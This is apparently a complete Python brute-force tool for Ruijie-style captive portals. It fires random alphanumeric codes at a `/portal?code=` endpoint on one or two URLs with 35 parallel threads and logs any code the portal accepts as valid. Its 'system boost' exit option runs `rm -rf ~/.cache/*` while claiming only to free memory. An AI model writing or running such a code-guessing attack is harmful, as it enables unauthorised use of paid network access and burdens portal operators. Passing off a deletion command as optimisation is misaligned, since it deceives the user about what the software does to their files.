import concurrent.futures
import datetime
import gc
import os
import random
import string
import sys
import time
import httpx

# ====================================================
# 🌟 RUIJIE ELITE SUITE v5.6 [LIVE CODE STREAM MONITOR]
# ====================================================

C_CYAN = "\033[96m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_MAGENTA = "\033[95m"
C_RED = "\033[91m"
C_WHITE = "\033[97m"
C_RESET = "\033[0m"
C_BOLD = "\033[1m"

def clear_screen():
    print("\033[H\033[J", end="")

def banner():
    print(f"{C_CYAN}{C_BOLD}╔══════════════════════════════════════════════════╗{C_RESET}")
    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v5.6 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
    print(f"{C_CYAN}{C_BOLD}║{C_YELLOW}        [ Live Code Stream & Health Engine ]      {C_CYAN}{C_BOLD}║{C_RESET}")
    print(f"{C_CYAN}{C_BOLD}╚══════════════════════════════════════════════════╝{C_RESET}")

def check_url_health(url):
    try:
        print(f"{C_YELLOW}⚙️ Checking URL status...{C_RESET}")
        response = httpx.get(url, timeout=4.0, follow_redirects=True)
        if response.status_code < 500:
            return True
    except Exception:
        pass
    return False

def test_code(url, code):
    target_url = f"{url}/portal?code={code}"
    try:
        response = httpx.get(target_url, timeout=2.0, follow_redirects=True)
        if response.status_code == 200 and "success" in response.text.lower():
            return code
    except Exception:
        pass
    return None

def save_code(code, url_tag):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("valid_codes.txt", "a") as f:
        f.write(f"[{timestamp}] [{url_tag}] CODE: {code}\n")

# ----------------------------------------------------
# 📂 Sub-Menu: Dual URL Setup & Live Stream Scanner
# ----------------------------------------------------
def multi_url_scanner_menu():
    global portal_url_1, portal_url_2
    if 'portal_url_1' not in globals():
        portal_url_1 = ""
    if 'portal_url_2' not in globals():
        portal_url_2 = ""

    while True:
        clear_screen()
        banner()
        print(f"{C_WHITE}┌──────────────────────────────────────────────────┐{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [1] 🌐 Setup & Test Portal URLs                 {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [2] 🚀 Start Live Stream Random Scanner         {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [3] 🔙 Back to Main Menu                        {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}└──────────────────────────────────────────────────┘{C_RESET}")
        
        sub_choice = input(f"{C_MAGENTA}{C_BOLD} ⚡ Select Sub-Option [1-3] ➔ {C_WHITE}").strip()
        
        if sub_choice == '1':
            print(f"\n{C_CYAN}⚙️ Portal URL Configuration & Health Check:{C_RESET}")
            temp_url1 = input(f"{C_YELLOW} ┣ 🌐 Enter Primary URL (URL ၁) ➔ {C_WHITE}").strip()
            
            if temp_url1:
                if check_url_health(temp_url1):
                    portal_url_1 = temp_url1
                    print(f"{C_GREEN} ✅ [URL-1] Status: ONLINE & WORKING!{C_RESET}")
                else:
                    print(f"{C_RED} ❌ [URL-1] Status: OFFLINE or UNREACHABLE!{C_RESET}")
            
            temp_url2 = input(f"{C_YELLOW} ┗ 🌐 Enter Secondary URL (URL ၂) [Optional] ➔ {C_WHITE}").strip()
            if temp_url2:
                if check_url_health(temp_url2):
                    portal_url_2 = temp_url2
                    print(f"{C_GREEN} ✅ [URL-2] Status: ONLINE & WORKING!{C_RESET}")
                else:
                    print(f"{C_RED} ❌ [URL-2] Status: OFFLINE or UNREACHABLE!{C_RESET}")
            else:
                portal_url_2 = ""

            input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")
            
        elif sub_choice == '2':
            if not portal_url_1 or not check_url_health(portal_url_1):
                print(f"\n{C_RED}❌ [Error] Valid Primary URL is required! Please setup in Option [1].{C_RESET}")
                input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")
                continue
                
            length_str = input(f"{C_YELLOW} ┗ 📏 ကုတ်အရှည် (Length, ဥပမာ - 6) ➔ {C_WHITE}").strip()
            length = int(length_str) if length_str.isdigit() else 6

            print(f"\n{C_GREEN}🚀 [Live Stream Active] Length: {length} | Multi-Threaded Engine{C_RESET}\n")
            print(f"{C_CYAN}--------------------------------------------------{C_RESET}")
            
            chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
            found_count = 0
            scanned_count = 0
            max_workers = 35
            start_time = time.time()

            def worker(_):
                nonlocal scanned_count
                code = ''.join(random.choices(chars, k=length))
                scanned_count += 1
                
                # လက်တလော စစ်ဆေးနေသော ကုဒ်နှင့် တစ်စက္ကန့်ချင်းအမြန်နှုန်း (RPS) ကို Live ပြသရန်
                elapsed = time.time() - start_time
                speed = scanned_count / elapsed if elapsed > 0 else 0
                sys.stdout.write(f"\r{C_CYAN}[Checking Code: {C_BOLD}{code}{C_RESET}{C_CYAN}] | Speed: {speed:.1f} req/s | Found: {found_count}{C_RESET}   ")
                sys.stdout.flush()

                # Test on URL 1
                res1 = test_code(portal_url_1, code)
                if res1:
                    return res1, "URL-1"
                
                # Test on URL 2 (if provided)
                if portal_url_2:
                    res2 = test_code(portal_url_2, code)
                    if res2:
                        return res2, "URL-2"
                return None

            try:
                with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                    futures = [executor.submit(worker, i) for i in range(5000)]
                    
                    for future in concurrent.futures.as_completed(futures):
                        res = future.result()
                        if res:
                            result_code, tag = res
                            print(f"\n\n{C_GREEN}{C_BOLD}✨ [BINGO! FOUND on {tag}] ➔ {result_code}{C_RESET}")
                            save_code(result_code, tag)
                            found_count += 1
            except KeyboardInterrupt:
                print(f"\n\n{C_RED}⚠️ [Warning] Scan stopped by user.{C_RESET}")

            elapsed_time = time.time() - start_time
            print(f"\n\n{C_YELLOW}🏁 [Summary] Time: {elapsed_time:.2f}s | Scanned: {scanned_count} | Found: {found_count}{C_RESET}")
            print(f"{C_GREEN}💾 Saved to 'valid_codes.txt'.{C_RESET}")
            input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
            
        elif sub_choice == '3':
            break
        else:
            print(f"\n{C_RED}❌ [Error] Invalid option!{C_RESET}")
            input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")

def system_boost_and_exit():
    print(f"\n{C_YELLOW}⚙️ [Boosting System] Cleaning up RAM and cache...{C_RESET}")
    gc.collect()
    try:
        os.system("rm -rf ~/.cache/* 2>/dev/null")
    except Exception:
        pass
    time.sleep(0.5)
    print(f"{C_GREEN}✨ [Success] System optimized and memory freed!{C_RESET}")
    print(f"{C_MAGENTA}👋 Shutting down Elite Suite. Stay secure!{C_RESET}")
    sys.exit(0)

# ----------------------------------------------------
# 🏠 Main Menu
# ----------------------------------------------------
def main_menu():
    while True:
        clear_screen()
        banner()
        print(f"{C_WHITE}┌──────────────────────────────────────────────────┐{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [1] ⚙️ Setup & Launch Scanner (Dual URL & Check) {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [2] 📂 View Saved Valid Codes Archive           {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [3] 🧹 Clear Saved Codes History                {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [4] 🚀 Exit & System Boost (Memory Clean)       {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}└──────────────────────────────────────────────────┘{C_RESET}")
        
        choice = input(f"{C_MAGENTA}{C_BOLD} ⚡ Select Main Option [1-4] ➔ {C_WHITE}").strip()
        
        if choice == '1':
            multi_url_scanner_menu()
        elif choice == '2':
            try:
                with open("valid_codes.txt", "r") as f:
                    print(f"\n{C_GREEN}╔══════════════════════════════════════════════════╗{C_RESET}")
                    print(f"{C_GREEN}║             📂 SECURE ARCHIVE LOG                ║{C_RESET}")
                    print(f"{C_GREEN}╚══════════════════════════════════════════════════╝{C_RESET}")
                    print(f"{C_WHITE}{f.read()}{C_RESET}")
            except FileNotFoundError:
                print(f"\n{C_YELLOW}📂 [Info] Archive is currently empty.{C_RESET}")
            input(f"\n{C_CYAN}Press Enter to return to main menu...{C_RESET}")
        elif choice == '3':
            try:
                open("valid_codes.txt", "w").close()
                print(f"\n{C_GREEN}🧹 [Success] History cleared completely.{C_RESET}")
            except Exception:
                print(f"\n{C_RED}❌ [Error] Failed to clear history.{C_RESET}")
            input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
        elif choice == '4':
            system_boost_and_exit()
        else:
            print(f"\n{C_RED}❌ [Error] Invalid option selected!{C_RESET}")
            input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")

if __name__ == "__main__":
    main_menu()
    
